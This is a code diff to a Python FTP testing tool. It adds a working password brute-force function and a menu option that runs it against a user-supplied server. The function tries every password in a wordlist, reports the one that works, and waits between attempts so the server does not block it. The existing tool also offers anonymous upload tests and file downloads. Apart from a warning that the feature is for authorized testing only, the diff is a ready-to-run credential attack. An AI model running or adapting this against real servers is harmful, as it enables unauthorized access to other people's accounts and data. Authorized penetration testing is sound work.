@@ -1,8 +1,12 @@
 import ftplib
 import tempfile
 import logging
+import sys
+import time
+from colorama import Fore, Style, init
 from typing import Optional
 
+init(autoreset=True)
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 def grab_banner(target: str) -> None:
@@ -80,6 +84,45 @@ def download_file(target: str, username: str, password: str, remote_file: str, l
     except Exception as e:
         logging.error(f"Failed to download file {remote_file}: {e}")
 
+def simulate_brute_force(target: str, delay: str,  username: str, password_file: str) -> Optional[str]:
+    """Attempts to brute force FTP login using a list of passwords from a file."""
+
+    logging.warning(Fore.GREEN + Style.BRIGHT + "Warning: Use this feature only for authorized penetration testing on systems you have permission to test.")
+    try:
+        delay = int(delay)
+        with open(password_file, 'r') as file:
+            passwords = file.readlines()
+        
+        no_of_passwords = len(passwords)
+        logging.info(Fore.BLUE + f"Starting brute force attack with {no_of_passwords} passwords.")
+
+        start_time = time.time()
+        for attempt, password in enumerate(passwords, start=1):
+            password = password.strip()
+            try:
+                with ftplib.FTP(target) as ftp:
+                    ftp.login(user=username, passwd=password)
+                    sys.stdout.write("\n")
+                    logging.info(Fore.RED + f"Successful login with password: {Style.BRIGHT}{Fore.RED}{password}{Style.RESET_ALL} | {Fore.BLUE} Total attempts: {attempt} | Elapsed time: {time.time() - start_time:.1f} seconds")
+                    return password
+            except ftplib.error_perm:
+                 sys.stdout.write(Fore.BLUE + f"\rCurrent Login attempts: {attempt}..")
+                 sys.stdout.flush()
+            except ftplib.error_temp as e:
+                logging.warning(Fore.GREEN + f"Temporary error on attempt: {attempt} | {e}")
+            except ftplib.all_errors as e:
+                logging.error(Fore.GREEN + f"FTP error on attempt: {attempt} | {e}")
+
+            """ to avoid getting blocked by the server i added a delay between attempts | ratelimiting the attack """
+            time.sleep(delay)
+    except FileNotFoundError:
+        logging.error(Fore.BLUE + f"Password file {password_file} was not found.")
+    except Exception as e:
+        logging.error(Fore.GREEN + f"Error during brute force attempt: {e}")
+    sys.stdout.write("\n")
+    logging.error(Fore.GREEN +"Brute force attack failed. No valid password found in the list.")
+    return None
+
 if __name__ == "__main__":
     target_ip = input("Enter the FTP server IP: ")
     print("\nChoose an option:")
@@ -88,7 +131,9 @@ if __name__ == "__main__":
     print("3. Test Write Permissions")
     print("4. Test Anonymous File Upload")
     print("5. Download a File")
-    choice = input("Enter your choice (1-5): ")
+    print("6. Simulate Brute Force Attack")
+    print("\nq. Exit")
+    choice = input("Enter your choice (1-6): ")
 
     if choice == "1":
         grab_banner(target_ip)
@@ -107,5 +152,12 @@ if __name__ == "__main__":
         remote_file = input("Enter the path of the remote file (e.g., /config/backup.txt): ")
         local_file = input("Enter the path to save the file locally (e.g., backup.txt): ")
         download_file(target_ip, username, password, remote_file, local_file)
+    elif choice == "6":
+        username = input("Enter username: ")
+        delay = input("Enter the delay between attempts (in seconds) : ")
+        password_file = input("Enter the path to the password file (e.g., passwords.txt): ")
+        simulate_brute_force(target_ip, delay, username, password_file)
+    elif choice == "q":
+        sys.exit()
     else:
         logging.error("Invalid choice. Exiting.")
